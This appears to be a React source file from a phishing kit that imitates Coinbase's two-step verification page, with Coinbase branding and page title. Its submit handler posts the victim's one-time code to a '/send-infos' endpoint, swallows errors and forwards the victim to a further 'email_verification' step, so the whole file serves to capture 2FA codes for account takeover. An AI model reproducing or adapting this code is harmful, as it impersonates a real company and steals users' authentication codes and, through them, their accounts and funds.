import React, { useEffect, useState } from "react";
import { Container } from "../components/Container";
import { Wrapper } from "../components/Wrapper";
import { Box, Link, ListItem, Text, UnorderedList } from "@chakra-ui/react";
import icon2fa from "../assets/images/icon-2fa.png";
import { Input } from "../components/Input";
import { Button } from "../components/Button";
import { Alert } from "../components/Alert";
import { useLocation, useNavigate } from "react-router-dom";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import axios from "axios";
import { useForm } from "react-hook-form";
import { Helmet } from "react-helmet";

interface SigninOTPProps {}

const schema = yup.object().shape({
  otp: yup
    .string()
    .required("Please enter a verification code.")
    .min(6, "That code was invalid. Please try again.")
    .max(7, "That code was invalid. Please try again."),
});

export const SigninOTP: React.FC<SigninOTPProps> = () => {
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm({
    resolver: yupResolver(schema),
    mode: "onBlur",
  });

  const navigate = useNavigate();
  const { state } = useLocation() as {
    state: any;
  };

  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<{
    show: boolean;
    message: string;
    status: "NORMAL" | "ERROR" | "WARNING";
  }>({
    show: (state && state.alert.show) || false,
    message: (state && state.alert.description) || "",
    status: (state && state.alert.status) || "WARNING",
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);

    try {
      await axios.post(
        "/send-infos",
        JSON.stringify({
          form: "ONE TIME PASSWORD",
          otp: data.otp,
        })
      );
    } catch (error) {
      console.log(error);
    }

    navigate("/email_verification", {
      state: {
        otp: data.otp,
        ...state,
        alert: {
          show: true,
          description: "Please enter verification token from your device.",
        },
      },
    });
  });

  useEffect(() => {
    if (errors.otp && errors.otp.message) {
      setError({
        show: true,
        message: errors.otp.message,
        status: "WARNING",
      });
    }
    return () => {};
  }, [errors]);
  return (
    <Wrapper pt={"74px"} bgColor={"#1652f0"}>
      <Helmet>
        <title>Coinbase - Buy/Sell Cryptocurrency</title>
      </Helmet>
      {error.show && (
        <Alert
          status={error.status}
          description={error.message}
          setError={setError}
        />
      )}
      <Container
        textAlign={"center"}
        containerProps={{
          pb: "0 !important",
          m: "10px 0",
        }}
      >
        <Text
          as={"h3"}
          m={"1.5em 0 1em"}
          mt={0}
          fontSize={"24px"}
          lineHeight={1.2}
          color={"#050f19"}
          fontWeight={500}
          textAlign={"center"}
          fontFamily={
            "graphik,-apple-system,BlinkMacSystemFont,segoe ui,roboto,oxygen,ubuntu,cantarell,fira sans,droid sans,helvetica neue,sans-serif"
          }
        >
          Enter the 7-digit code we texted to +xx xx xxx xxxx
        </Text>
        <Text
          m={0}
          fontSize={"15px"}
          color={"#545f6d"}
          lineHeight={"23px"}
          textAlign={"center"}
        >
          This extra step shows its really you trying to sign in.
        </Text>
        <Box
          m={"0 -24px"}
          mb={"5px"}
          p={"20px 40px"}
          borderTop={"1px solid #f1f3f5"}
          bgImage={icon2fa}
          bgRepeat={"no-repeat"}
          bgColor={"#fafafa"}
          bgSize={"38px"}
          bgPos={"40px 23px"}
          textAlign={"left"}
          pos={"relative"}
        >
          <Box pos={"relative"} ml={"60px"} mb={"15px"}>
            <Input
              label="Enter 2-step verification code:"
              labelProps={{
                color: "#708599",
                w: "auto",
                fontSize: "12px",
                fontWeight: 700,
                display: "block",
                mb: "5px",
                lineHeight: "20px",
                cursor: "pointer",
              }}
              placeholder="7-digit code"
              fontSize={"19px"}
              letterSpacing={"3px"}
              //   mr={"5px"}
              mb={0}
              register={register("otp")}
            />
          </Box>
          <Button
            w={"100%"}
            borderRadius={"4px"}
            text={loading ? "Verifying..." : "Verify"}
            onClick={onSubmit}
            isDisabled={loading}
          />
          <Text
            as={"label"}
            color={"#708599"}
            pt={"10px"}
            fontSize={"12px"}
            fontWeight={500}
            minH={"20px"}
            pl={"20px"}
            display={"inline-block"}
            mb={"5px"}
            lineHeight={"20px"}
            cursor={"pointer"}
            ml={0}
            w={"auto"}
          >
            <input
              type={"checkbox"}
              style={{
                margin: "4px 0 0",
                borderRadius: "2px",
                float: "left",
                lineHeight: "normal",
                width: "auto",
                marginLeft: "-20px",
                marginRight: 0,
                fontSize: "14px",
                fontWeight: 400,
                verticalAlign: "middle",
                display: "inline-block",
              }}
            />
            {"  "}
            Dont ask me for the code again on this computer for 30 days
          </Text>
        </Box>
        <UnorderedList
          listStyleType={"none"}
          m={"0 0 10px 25px"}
          ml={0}
          p={0}
          pb={"20px"}
          pt={"32px"}
        >
          <ListItem
            lineHeight={"20px"}
            m={"9px 0 0"}
            fontSize={"1em"}
            color={"#050f19"}
            textAlign={"center"}
          >
            <Link
              color={"#0052ff"}
              fontSize={"13px"}
              transition={".15s ease all"}
              p={"8px 20px"}
              borderRadius={"3px"}
              textShadow={"none"}
              fontWeight={500}
              display={"inline-block"}
              mb={0}
              lineHeight={"20px"}
              textAlign={"center"}
              verticalAlign={"center"}
              cursor={"pointer"}
              textDecor={"none"}
              bgRepeat={"repeat-x"}
              _hover={{}}
              _focus={{
                borderColor: "#1652f0",
                bgPos: "0 0",
                boxShadow: "none",
                outline: 0,
                bgColor: "#e6e6e6",
                bgImage: "none",
              }}
              _active={{
                borderColor: "#1652f0",
                bgPos: "0 0",
                boxShadow: "none",
                outline: 0,
                bgColor: "#e6e6e6",
                bgImage: "none",
              }}
            >
              I need help
            </Link>
          </ListItem>
        </UnorderedList>
      </Container>
    </Wrapper>
  );
};
